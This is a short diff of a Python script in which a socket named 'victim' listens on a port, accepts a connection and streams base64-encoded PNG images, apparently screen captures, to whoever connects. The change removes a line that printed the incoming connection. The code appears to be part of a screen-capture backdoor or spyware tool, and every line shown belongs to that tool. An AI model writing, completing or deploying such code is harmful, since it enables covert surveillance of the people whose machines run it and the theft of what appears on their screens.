@@ -12,9 +12,7 @@ victim=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 victim.bind(('', port))
 victim.listen()
 c, addr = victim.accept()
-msg=""
-recieved=""
-print("CONNECTION FROM:", str(addr))
+
 def reciever():
     recieved=c.recv(1024)
     while True:
@@ -25,7 +23,7 @@ def sender():
         buffered = BytesIO()
         img.save(buffered, format="PNG")
         img_str = base64.b64encode(buffered.getvalue())
-        c.sendall(img_str)
+        c.send(img_str)
 reciever=threading.Thread(target=reciever)
 reciever.start()
 sender=threading.Thread(target=sender)
